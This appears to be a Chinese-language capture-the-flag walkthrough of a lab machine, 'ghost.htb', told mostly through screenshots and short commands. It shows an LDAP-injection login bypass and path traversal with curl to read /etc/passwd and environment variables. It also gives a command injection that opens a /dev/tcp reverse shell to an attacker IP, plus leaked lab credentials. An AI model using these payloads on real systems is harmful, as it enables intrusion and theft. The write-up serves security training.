<img width="415" height="219" alt="image" src="https://github.com/user-attachments/assets/9b70e3e6-0584-4695-8d53-db577951d3ae" />

Nmap端口扫描

<img width="415" height="391" alt="image" src="https://github.com/user-attachments/assets/d78358ee-2eea-4862-a5f3-f65c5668d953" />

访问80端口

<img width="415" height="310" alt="image" src="https://github.com/user-attachments/assets/2c7de910-47c3-4890-9c8f-fdc6c96e94d5" />

访问8008

<img width="416" height="297" alt="image" src="https://github.com/user-attachments/assets/ed92d381-38fa-4060-9b24-47973062d7d7" />

访问8443
<img width="415" height="311" alt="image" src="https://github.com/user-attachments/assets/eec8d8a8-3467-4419-b6fe-2624489a37d5" />


对这8008 8443进行探测

<img width="416" height="313" alt="image" src="https://github.com/user-attachments/assets/c380b912-19aa-4a50-b9da-688a74ebd9f6" />

<img width="416" height="313" alt="image" src="https://github.com/user-attachments/assets/38ab1587-d759-41ee-98b9-c93ead00fd2b" />

在登陆框中输入*
通过LDAP注入成功登录

<img width="416" height="315" alt="image" src="https://github.com/user-attachments/assets/b90256d0-793f-47cf-8ed8-3ea005171f67" />

记住这些user

<img width="319" height="276" alt="image" src="https://github.com/user-attachments/assets/0f79ed2d-f46c-49ca-ac15-d4dd5d0e727e" />

使用kerbrute对这些用户名进行有效验证

<img width="415" height="325" alt="image" src="https://github.com/user-attachments/assets/46c0449c-d12f-4b4a-89e4-05195ef22248" />

访问http://gitea.ghost.htb:8008/
是一个gitea服务
<img width="415" height="318" alt="image" src="https://github.com/user-attachments/assets/bb0c3640-7d7d-4c69-9f15-c1894b5b004c" />

使用git.py获取密码
<img width="323" height="270" alt="image" src="https://github.com/user-attachments/assets/8bedfec0-48cb-4999-8e36-5dd6220f851c" />

<img width="305" height="240" alt="image" src="https://github.com/user-attachments/assets/697d23e7-a0f6-47e4-b540-ac52792267c0" />

gitea_temp_principal
szrr8kpc3z6onlqf

<img width="416" height="311" alt="image" src="https://github.com/user-attachments/assets/58da2639-952b-426c-9c52-d8fb4aaf8bcb" />

登录成功

<img width="416" height="309" alt="image" src="https://github.com/user-attachments/assets/b6ae8f2c-c99b-4b44-814a-7b4568a79daf" />

找到了一个带有API端点的存储库

http://gitea.ghost.htb:8008/ghost-dev/intranet/src/branch/main/backend/src/api/dev.rs
这里文件提示我们需要找到X-DEV-INTRANET-KEY

<img width="415" height="334" alt="image" src="https://github.com/user-attachments/assets/3c83fb98-d345-44b9-a1ab-b5f0948fc211" />
我们可以执行命令bash
点击搜索按钮
<img width="415" height="308" alt="image" src="https://github.com/user-attachments/assets/6b5a7628-bb8f-4e86-91fb-1c38061b08a4" />
拿到key 37395e9e872be56438c83aaca6

<img width="415" height="123" alt="image" src="https://github.com/user-attachments/assets/911ba44f-eb02-4c1b-a622-9ef1d7fb8e53" />

curl http://ghost.htb:8008/ghost/api/v3/content/posts/? -G --data-urlencode "key=37395e9e872be56438c83aaca6" --data-urlencode "extra=../../../../etc/passwd"
文件读取成功

<img width="416" height="182" alt="image" src="https://github.com/user-attachments/assets/7cfe7305-a867-41d3-b769-b29c784fad9d" />

提权环境变量
curl http://ghost.htb:8008/ghost/api/v3/content/posts/? -G --data-urlencode "key=37395e9e872be56438c83aaca6" --data-urlencode "extra=../../../../proc/self/environ"
<img width="416" height="85" alt="image" src="https://github.com/user-attachments/assets/e767f168-b5cd-4129-9c42-db3eb171ff2e" />

拿到dev-key !@yqr!X2kxmQ.@Xe
尝试使用dev-key进行反弹shell
curl http://intranet.ghost.htb:8008/api-dev/scan -X POST -H 'X-DEV-INTRANET-KEY:!@yqr!X2kxmQ.@Xe' -H 'Content-Type: application/json' -d '{"url": "0<&196;exec 196<>/dev/tcp/10.10.16.33/1234; /bin/bash <&196 >&196 2>&196"}'

<img width="393" height="98" alt="image" src="https://github.com/user-attachments/assets/556eb32b-8ae5-4ec6-9d25-ad15635026bc" />


拿到docker-shell
去/目录看看
<img width="415" height="330" alt="image" src="https://github.com/user-attachments/assets/91850db9-546e-439b-9696-619bc38f6c55" />

<img width="415" height="99" alt="image" src="https://github.com/user-attachments/assets/f8ec55d9-88d1-4538-a6eb-d5cbf43b1edf" />

impacket-mssqlclient florence.ramirez:'uxLmt*udNc6t3HrF'@ghost.htb -windows-auth

<img width="415" height="127" alt="image" src="https://github.com/user-attachments/assets/8a688308-bd61-4d92-9085-3979bbda5a6e" />

<img width="415" height="221" alt="image" src="https://github.com/user-attachments/assets/588e385c-f0a2-4b6a-b83e-a56e8d74a71f" />






